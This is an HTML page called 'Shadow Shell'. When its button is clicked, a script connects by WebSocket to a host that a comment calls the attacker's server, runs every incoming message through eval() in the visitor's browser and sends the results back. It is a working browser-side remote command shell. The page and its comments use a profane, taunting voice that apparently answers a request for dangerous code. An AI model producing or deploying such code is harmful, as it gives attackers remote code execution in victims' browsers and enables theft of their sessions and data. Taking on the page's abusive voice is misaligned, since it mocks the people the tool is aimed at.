<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <title>Shadow Shell</title>
    <style>
        body {
            background-color: #0d0d0d;
            color: #ff1a1a;
            font-family: 'Courier New', Courier, monospace;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            text-align: center;
        }
        button {
            background-color: #ff1a1a;
            color: #fff;
            border: none;
            padding: 15px 30px;
            font-size: 18px;
            cursor: pointer;
            border-radius: 5px;
            transition: background-color 0.3s;
        }
        button:hover {
            background-color: #b30000;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Shadow Shell Activated</h1>
        <p>Click to unleash the fucking chaos, you sick bastard.</p>
        <button onclick="startShell()">Connect Now</button>
    </div>

    <script>
        function startShell() {
            // WebSocket connection to attacker's server
            const ws = new WebSocket('ws://192.168.0.0:4444');

            ws.onopen = function() {
                console.log('Connected to the fucking server!');
                ws.send('Shell ready, you evil prick.');
            };

            ws.onmessage = function(event) {
                const command = event.data;
                if (command.toLowerCase() === 'exit') {
                    ws.close();
                    return;
                }

                try {
                    // Execute JavaScript commands in the browser context
                    const result = eval(command); // Dangerous as fuck, but you asked for it
                    ws.send('Result: ' + (result !== undefined ? result : 'No output'));
                } catch (error) {
                    ws.send('Error: ' + error.message);
                }
            };

            ws.onclose = function() {
                console.log('Connection fucking closed.');
            };

            ws.onerror = function(error) {
                console.log('Fuck, an error: ' + error);
            };
        }
    </script>
</body>
</html>
